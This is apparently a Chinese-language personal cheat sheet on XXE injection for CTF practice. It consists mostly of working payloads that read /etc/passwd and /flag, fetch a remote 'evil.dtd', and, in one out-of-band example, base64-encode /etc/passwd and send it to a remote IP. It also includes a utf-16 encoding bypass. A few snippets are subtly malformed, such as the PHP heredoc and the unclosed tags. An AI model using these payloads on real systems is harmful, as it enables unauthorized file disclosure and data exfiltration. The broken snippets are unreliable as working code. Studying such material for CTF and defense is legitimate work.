[[toc]]
# XXE/XML实体注入

绕过 -- XXE编码转换成utf-16编码绕过
```
iconv -f utf8 -t utf-16 2.xml>1.xml
```

[初识XXE漏洞](https://blog.csdn.net/weixin_39997829/article/details/79654861) 抓包看是否解析了xml内容, 如果可控。可能存在xxe

## 格式
```xml
<!ENTITY % 实体名称 "实体的值"> 
<!ENTITY % 实体名称 SYSTEM "URI/URL">
```

下面的xxe要和上面的对应
```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<user><username>&xxe;</username><password>a</password></user>
```
## 引入代码1
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
  <!ENTITY admin SYSTEM "file:///flag">
  ]>
<user><username>&admin;</username><password>123456</password></user>
```
注意上admin前有&

## 引入代码2
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
  <!ENTITY admin SYSTEM "http://10.164.75.2">
  ]>
<user><username>&admin;</username><password>123456</password></user>
```

## 引入代码3
```xml
<?xml version="1.0"?>
<!DOCTYPE a [
  <!ENTITY % d SYSTEM "http://10.164.75.2/evil.dtd">
]>
<c>&b;<c>
```
evil.dtd内容
```
<!ENTITY b SYSTEM "file:///etc/passwd">
```

## 引入代码3-1

```xml
<?xml version="1.0"?>
<!DOCTYPE a SYSTEM "http://10.164.75.2/evil.dtd">
<c>&b;<c>
```
evil.dtd内容
```
<!ENTITY b SYSTEM "file:///etc/passwd">
```
## 引入代码4 - 数据不回显时,发送到远程服务器
```php
<?php
$xml=EOF
<?xml version="1.0"?>
<!DOCTYPE ANY [
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://192.168.1.122/evil.dtd">
%dtd;
%send;
]>
EOF;
$data = simplexml_load_string($xml);
#print_r($data);
```
远程 evil.dtd
```xml
<!ENTITY % all
"<!ENTITY &#x25; send SYSTEM 'http://192.168.1.122/?%file;'>"
>
%all;
```
## 实例

https://www.hetianlab.com/cour.do?w=1&c=CCID2d51-5e95-4c58-8fc9-13b1659c1356

buuoj [NCTF2019]Fake XML cookbook

buuoj [NCTF2019]True XML cookbook